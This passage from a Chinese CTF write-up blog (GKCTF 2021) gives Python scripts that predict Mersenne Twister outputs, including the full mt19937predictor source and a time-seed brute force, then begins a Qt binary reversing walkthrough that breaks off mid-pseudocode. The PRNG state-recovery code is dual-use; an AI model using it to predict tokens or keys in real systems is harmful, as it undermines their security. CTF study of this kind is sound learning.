<p>主要是用到了randcrack的库，看名字就是用来碰撞随机数的；但是可惜报错时我才意识到，题目给的只有312个数字，和624差两倍关系</p>
<blockquote>
<p>MT19937Recover</p>
</blockquote>
<p>还有一类脚本是定义了MT19937Recover的类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MT19937Recover</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Reverses the Mersenne Twister based on 624 observed outputs.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The internal state of a Mersenne Twister can be recovered by observing</span></span><br><span class="line"><span class="string">    624 generated outputs of it. However, if those are not directly</span></span><br><span class="line"><span class="string">    observed following a twist, another output is required to restore the</span></span><br><span class="line"><span class="string">    internal index.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    See also https://en.wikipedia.org/wiki/Mersenne_Twister#Pseudocode .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unshiftRight</span>(<span class="params">self, x, shift</span>):</span></span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            res = x ^ res &gt;&gt; shift</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unshiftLeft</span>(<span class="params">self, x, shift, mask</span>):</span></span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">untemper</span>(<span class="params">self, v</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot; Reverses the tempering which is applied to outputs of MT19937 &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        v = self.unshiftRight(v, <span class="number">18</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">        v = self.unshiftRight(v, <span class="number">11</span>)</span><br><span class="line">        <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">go</span>(<span class="params">self, outputs, forward=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Reverses the Mersenne Twister based on 624 observed values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            outputs (List[int]): list of &gt;= 624 observed outputs from the PRNG.</span></span><br><span class="line"><span class="string">                However, &gt;= 625 outputs are required to correctly recover</span></span><br><span class="line"><span class="string">                the internal index.</span></span><br><span class="line"><span class="string">            forward (bool): Forward internal state until all observed outputs</span></span><br><span class="line"><span class="string">                are generated.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Returns a random.Random() object.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        result_state = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(outputs) &gt;= <span class="number">624</span>  <span class="comment"># need at least 624 values</span></span><br><span class="line"></span><br><span class="line">        ivals = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">            ivals.append(self.untemper(outputs[i]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(outputs) &gt;= <span class="number">625</span>:</span><br><span class="line">            <span class="comment"># We have additional outputs and can correctly</span></span><br><span class="line">            <span class="comment"># recover the internal index by bruteforce</span></span><br><span class="line">            challenge = outputs[<span class="number">624</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">626</span>):</span><br><span class="line">                state = (<span class="number">3</span>, <span class="built_in">tuple</span>(ivals + [i]), <span class="literal">None</span>)</span><br><span class="line">                r = random.Random()</span><br><span class="line">                r.setstate(state)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> challenge == r.getrandbits(<span class="number">32</span>):</span><br><span class="line">                    result_state = state</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># With only 624 outputs we assume they were the first observed 624</span></span><br><span class="line">            <span class="comment"># outputs after a twist --&gt;  we set the internal index to 624.</span></span><br><span class="line">            result_state = (<span class="number">3</span>, <span class="built_in">tuple</span>(ivals + [<span class="number">624</span>]), <span class="literal">None</span>)</span><br><span class="line">        rand = random.Random()</span><br><span class="line">        rand.setstate(result_state)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> forward:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>, <span class="built_in">len</span>(outputs)):</span><br><span class="line">                <span class="keyword">assert</span> rand.getrandbits(<span class="number">32</span>) == outputs[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> rand</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_PythonMT19937Recover</span>():</span></span><br><span class="line">    mtb = MT19937Recover()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        lines = fp.readlines()</span><br><span class="line">        lines = [<span class="built_in">int</span>(_.strip()) <span class="keyword">for</span> _ <span class="keyword">in</span> lines]</span><br><span class="line">    r2 = mtb.go(lines)</span><br><span class="line">    <span class="built_in">print</span>(r2.getrandbits(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_PythonMT19937Recover()</span><br></pre></td></tr></table></figure>

<p>但是还是不行，看注释介绍，人家本来就是用来基于624个已知状态的</p>
<blockquote>
<p>MT19937Predictor</p>
</blockquote>
<p>已经放弃了，完全不知道在只知道一半状态的情况下怎么玩，一直坐等到看到别人战队的WP</p>
<p>先看看改编后成功的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    lines = fp.readlines()</span><br><span class="line">line = [<span class="built_in">int</span>(_.strip()) <span class="keyword">for</span> _ <span class="keyword">in</span> lines]</span><br><span class="line">Predictor = MT19937Predictor()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">    Predictor.setrandbits(line[i*<span class="number">3</span>], <span class="number">32</span>)</span><br><span class="line">    Predictor.setrandbits(line[i*<span class="number">3</span>+<span class="number">1</span>], <span class="number">64</span>)</span><br><span class="line">    Predictor.setrandbits(line[i*<span class="number">3</span>+<span class="number">2</span>], <span class="number">96</span>)</span><br><span class="line"></span><br><span class="line">key = Predictor.getrandbits(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(md5(<span class="built_in">str</span>(key).encode()).hexdigest())</span><br></pre></td></tr></table></figure>

<p>在运行过程中，用到了mt19937predictor的库，是一个github上的脚本，拿来学习学习</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># compatibility</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_to_bytes</span>(<span class="params">n, length, byteorder</span>):</span></span><br><span class="line">        <span class="keyword">assert</span> byteorder == <span class="string">&#x27;little&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&#x27;%x&#x27;</span> % n).zfill(length * <span class="number">2</span>).decode(<span class="string">&#x27;hex&#x27;</span>)[: : -<span class="number">1</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_from_bytes</span>(<span class="params">s, byteorder</span>):</span></span><br><span class="line">        <span class="keyword">assert</span> byteorder == <span class="string">&#x27;little&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">str</span>(s[: : -<span class="number">1</span>]).encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    _to_bytes = <span class="keyword">lambda</span> n, *args, **kwargs: n.to_bytes(*args, **kwargs)</span><br><span class="line">    _from_bytes = <span class="keyword">lambda</span> *args, **kwargs: <span class="built_in">int</span>.from_bytes(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">N = <span class="number">624</span>  <span class="comment">#: 624 values (of 32bit) is just enough to reconstruct the internal state</span></span><br><span class="line">M = <span class="number">397</span>  <span class="comment">#:</span></span><br><span class="line">MATRIX_A   = <span class="number">0x9908b0df</span>  <span class="comment">#:</span></span><br><span class="line">UPPER_MASK = <span class="number">0x80000000</span>  <span class="comment">#:</span></span><br><span class="line">LOWER_MASK = <span class="number">0x7fffffff</span>  <span class="comment">#:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tempering</span>(<span class="params">y</span>):</span></span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    y ^= (y &lt;&lt;  <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">untempering</span>(<span class="params">y</span>):</span></span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    y ^= ((y &lt;&lt;  <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>) ^ ((y &lt;&lt; <span class="number">14</span>) &amp; <span class="number">0x94284000</span>) ^ ((y &lt;&lt; <span class="number">21</span>) &amp; <span class="number">0x14200000</span>) ^ ((y &lt;&lt; <span class="number">28</span>) &amp; <span class="number">0x10000000</span>)</span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">11</span>) ^ (y &gt;&gt; <span class="number">22</span>)</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">mt, kk</span>):</span></span><br><span class="line">    mag01 = [<span class="number">0x0</span>, MATRIX_A]</span><br><span class="line">    y = (mt[kk] &amp; UPPER_MASK) | (mt[(kk + <span class="number">1</span>) % N] &amp; LOWER_MASK)</span><br><span class="line">    mt[kk] = mt[(kk + M) % N] ^ (y &gt;&gt; <span class="number">1</span>) ^ mag01[y &amp; <span class="number">0x1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genrand_int32</span>(<span class="params">mt, mti</span>):</span></span><br><span class="line">    generate(mt, mti)</span><br><span class="line">    y = mt[mti]</span><br><span class="line">    mti = (mti + <span class="number">1</span>) % N</span><br><span class="line">    <span class="keyword">return</span> tempering(y), mti</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MT19937Predictor</span>(<span class="params">random.Random</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Usage:</span></span><br><span class="line"><span class="string">    .. doctest::</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; import random</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; from mt19937predictor import MT19937Predictor</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; predictor = MT19937Predictor()</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; for _ in range(624):</span></span><br><span class="line"><span class="string">        ...     x = random.getrandbits(32)</span></span><br><span class="line"><span class="string">        ...     predictor.setrandbits(x, 32)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; random.getrandbits(32) == predictor.getrandbits(32)</span></span><br><span class="line"><span class="string">        True</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; random.random() == predictor.random()</span></span><br><span class="line"><span class="string">        True</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; a = list(range(100))</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; b = list(range(100))</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; random.shuffle(a)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; predictor.shuffle(b)</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; a == b</span></span><br><span class="line"><span class="string">        True</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._mt = [ <span class="number">0</span> ] * N</span><br><span class="line">        self._mti = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setrand_int32</span>(<span class="params">self, y</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;Feceive the target PRNG&#x27;s outputs and reconstruct the inner state.</span></span><br><span class="line"><span class="string">        when 624 consecutive DOWRDs is given, the inner state is uniquely determined.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="number">0</span> &lt;= y &lt; <span class="number">2</span> ** <span class="number">32</span></span><br><span class="line">        self._mt[self._mti] = untempering(y)</span><br><span class="line">        self._mti = (self._mti + <span class="number">1</span>) % N</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">genrand_int32</span>(<span class="params">self</span>):</span></span><br><span class="line">        y, self._mti = genrand_int32(self._mt, self._mti)</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setrandbits</span>(<span class="params">self, y, bits</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;The interface for :py:meth:`random.Random.getrandbits` in Python&#x27;s Standard Library</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (bits % <span class="number">32</span> == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;number of bits must be a multiple of 32&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= y &lt; <span class="number">2</span> ** bits):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;invalid state&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> bits == <span class="number">32</span>:</span><br><span class="line">            self.setrand_int32(y)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">while</span> bits &gt; <span class="number">0</span>:</span><br><span class="line">                self.setrand_int32(y &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">                y &gt;&gt;= <span class="number">32</span></span><br><span class="line">                bits -= <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getrandbits</span>(<span class="params">self, bits</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;The interface for :py:meth:`random.Random.getrandbits` in Python&#x27;s Standard Library</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (bits &gt; <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;number of bits must be greater than zero&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> bits &lt;= <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">return</span> self.genrand_int32() &gt;&gt; (<span class="number">32</span> - bits)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            acc = <span class="built_in">bytearray</span>()</span><br><span class="line">            <span class="keyword">while</span> bits &gt; <span class="number">0</span>:</span><br><span class="line">                r = self.genrand_int32()</span><br><span class="line">                <span class="keyword">if</span> bits &lt; <span class="number">32</span>:</span><br><span class="line">                    r &gt;&gt;= <span class="number">32</span> - bits</span><br><span class="line">                acc += _to_bytes(r, <span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">                bits -= <span class="number">32</span></span><br><span class="line">            <span class="keyword">return</span> _from_bytes(acc, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">random</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;The interface for :py:meth:`random.Random.random` in Python&#x27;s Standard Library</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        a = self.genrand_int32() &gt;&gt; <span class="number">5</span></span><br><span class="line">        b = self.genrand_int32() &gt;&gt; <span class="number">6</span></span><br><span class="line">        <span class="keyword">return</span> ((a * <span class="number">67108864.0</span> + b) * (<span class="number">1.0</span> / <span class="number">9007199254740992.0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">seed</span>(<span class="params">self, *args</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Raises:</span></span><br><span class="line"><span class="string">            :py:exc:`NotImplementedError`</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setstate</span>(<span class="params">self, *args</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Raises:</span></span><br><span class="line"><span class="string">            :py:exc:`NotImplementedError`</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getstate</span>(<span class="params">self, *args</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Raises:</span></span><br><span class="line"><span class="string">            :py:exc:`NotImplementedError`</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gauss</span>(<span class="params">self, *args</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Raises:</span></span><br><span class="line"><span class="string">            :py:exc:`NotImplementedError`</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br></pre></td></tr></table></figure>

<p>这里很神奇，它并不需要状态数满624，正如代码里说的，只要bit数是32的倍数就行</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-1698433b.png" alt="20210626GKCTF-1698433b.png"></p>
<p>可能是某些性质吧，没有深入研究了，近日尽快搞定这类的题型，因为不涉及数论，所以还是要够一够，逼一逼，毕竟这么多人都做出来了</p>
<h4 id="失败的思路"><a href="#失败的思路" class="headerlink" title="失败的思路"></a>失败的思路</h4><p>还有一个思路，前面提到，由于我习惯不好，总是在源文件上修改，导致把题目改不回来了，所以多次下载。在这过程中，我终于发现到这个random.txt文件最后的修改地址竟然是2021年6月16日14点14分</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-0436bb67.png" alt="20210626GKCTF-0436bb67.png"></p>
<p>好！</p>
<p>拿别人脚本跑出来的哪有自己写的香（chòu）</p>
<p>于是我尝试枚举时间种子，因为按理说，其他语言使用随机数是要设置种子seed的，python偷懒帮你用系统时间设置了；所以只要知道当时的系统时间，就能将这一连串的随机数揪毛线一样揪出来</p>
<p>就和2021年春秋杯网络安全联赛春季赛Crypto方向中的题目time一样，虽然是签到题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-de52a22c.png" alt="20210626GKCTF-de52a22c.png"></p>
<p>所以我尝试枚举，最大的一个问题就在于虽然seed的参数可以是浮点数，但是改变其中一位产生的随机数都是大不相同的，若是按照如下的步骤，需要爆破秒数以及7位小数位，差不多千万级别，分段爆破应该也是可以爆出来的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(time.time())</span></span><br><span class="line">random.seed(time.time())</span><br><span class="line">t = random.getrandbits(<span class="number">32</span>)</span><br></pre></td></tr></table></figure>

<p>但问题在于，python的random库到底是怎么设置默认seed的格式，如果不是，上面的方法也是白给；暂时也还看不来库函数</p>
<p>所以这种思路，先爆破一下行不行</p>
<p>跟着思路走，更进一步，我们甚至知道了秒数</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-d5cfea9a.png" alt="20210626GKCTF-d5cfea9a.png"></p>
<p>我尝试了，我失败了，七位小数位应该都枚举出来了，虽然其实7位和6位种子是一样的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-4bc29e98.png" alt="20210626GKCTF-4bc29e98.png"></p>
<p>但是依旧没有找到那个这题最开的种子，至于原因，那情况可多了去了，比如文件的时间并不是2021-06-16 14:14:04左右的。贴个脚本祭奠一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(type(time.time()))</span></span><br><span class="line"><span class="comment"># &lt;class &#x27;float&#x27;&gt; 1625111993.8610187</span></span><br><span class="line"></span><br><span class="line">dt = <span class="string">&quot;2021-06-16 14:14:04&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换成时间数组</span></span><br><span class="line">timeArray = time.strptime(dt, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="comment"># 转换成时间戳</span></span><br><span class="line">timestamp = time.mktime(timeArray)</span><br><span class="line"></span><br><span class="line">seed(<span class="built_in">float</span>(<span class="number">1623824044.999999</span>))</span><br><span class="line"><span class="built_in">print</span>(getrandbits(<span class="number">32</span>))</span><br><span class="line">seed(<span class="built_in">float</span>(<span class="number">1623824044.9999991</span>))</span><br><span class="line"><span class="built_in">print</span>(time.time())</span><br><span class="line"><span class="built_in">print</span>(getrandbits(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">                    <span class="keyword">for</span> i6 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">                        <span class="keyword">for</span> i7 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">                            Seed = timestamp + i1*<span class="number">0.1</span> + i2*<span class="number">0.01</span> + i3*<span class="number">0.001</span> + i4*<span class="number">0.0001</span> + i5*<span class="number">0.00001</span> + i6*<span class="number">0.000001</span> + i7*<span class="number">0.0000001</span></span><br><span class="line">                            <span class="built_in">print</span>(<span class="built_in">float</span>(Seed))</span><br><span class="line">                            seed(<span class="built_in">float</span>(Seed)*<span class="number">256</span>)</span><br><span class="line">                            a = getrandbits(<span class="number">32</span>)</span><br><span class="line">                            <span class="keyword">if</span> a == <span class="number">2584323193</span>:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="built_in">float</span>(Seed))</span><br><span class="line">                                sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="QQQQT"><a href="#QQQQT" class="headerlink" title="QQQQT"></a>QQQQT</h3><p>首先基操问候</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210703093043860.png" alt="image-20210703093043860"></p>
<p>32位没有加任何保护，运行一下程序，GUI如下；回想题目才意识到这是用Qt框架编写的一个C++小程序，正好我们这届大一短学期学的就是Qt</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210703093410876.png" alt="image-20210703093410876"></p>
<p>然后放入ida里面静态分析，好多函数，可是没有看到熟悉的main函数，最多只有一个叫WinMain的函数，尝试分析；好样的，看不懂</p>
<p>然后放入OD里面分析，鼠标右键，选择Search for，点All referenced text strings，然后会看到</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210703095700497.png" alt="image-20210703095700497"></p>
<p>东西不多，一下就能看到flag的字样，然后多了一个界面，和QQQQT.exe运行起来的界面一样，我没看就差掉了，然后上面这个文字搜索的东西没有了，再进去就变成</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210703100557729.png" alt="image-20210703100557729"></p>
<p>呜呜呜，找不到了</p>
<p>然后重新来一遍又是上面的那个界面，暂时不知道为什么；记录下push后面的地址，直接追踪过去</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704133825642.png" alt="image-20210704133825642"></p>
<p>回到IDA找到这个地址所在位置</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704134707659.png" alt="image-20210704134707659"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210704134828743.png" alt="image-20210704134828743"></p>
<p>终于找到关键函数，跳转过去shift+F12反编译一下，得到下面伪代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __thiscall <span class="title">sub_4012F0</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span>&#123;  <span class="keyword">int</span> v1; <span class="comment">// edi  _BYTE *v2; // esi  const char *v3; // edx  _BYTE *v4; // esi  int v5; // ecx  int v6; // eax  int v7; // ecx  int v8; // edx  int v9; // edi  int v10; // esi  _BYTE *v11; // ecx  unsigned int v12; // ecx  int v14; // [esp-8h] [ebp-A8h]  char v16[4]; // [esp+10h] [ebp-90h] BYREF  char v17[4]; // [esp+14h] [ebp-8Ch] BYREF  _BYTE *v18; // [esp+18h] [ebp-88h]  const char *v19; // [esp+1Ch] [ebp-84h]  int v20; // [esp+20h] [ebp-80h]  int v21; // [esp+24h] [ebp-7Ch] BYREF  _BYTE *v22; // [esp+28h] [ebp-78h] BYREF  char v23[60]; // [esp+2Ch] [ebp-74h] BYREF  __int128 v24[2]; // [esp+68h] [ebp-38h] BYREF  __int64 v25; // [esp+88h] [ebp-18h]  int v26; // [esp+9Ch] [ebp-4h]  MEMORY[0x5FF6](*(_DWORD *)(this[6] + 4), v16);  v26 = 0;  MEMORY[0x7C7C](v16, v17);  LOBYTE(v26) = 1;  v19 = (const char *)MEMORY[0x7C48](v17);  v24[0] = 0i64;  v24[1] = 0i64;  v25 = 0i64;  strcpy(v23, &quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;);  v21 = 138 * strlen(v19) / 0x64;  v14 = v21 + 1;  v1 = 0;  v22 = (_BYTE *)MEMORY[0x8114](v21 + 1);  v2 = v22;  sub_402C08(v22, 0, v14);  v3 = v19;  v20 = (int)(v19 + 1);  if ( strlen(v19) )  &#123;    v4 = &amp;v2[v21];    v18 = v4;    while ( 1 )    &#123;      v20 = ((char)*v4 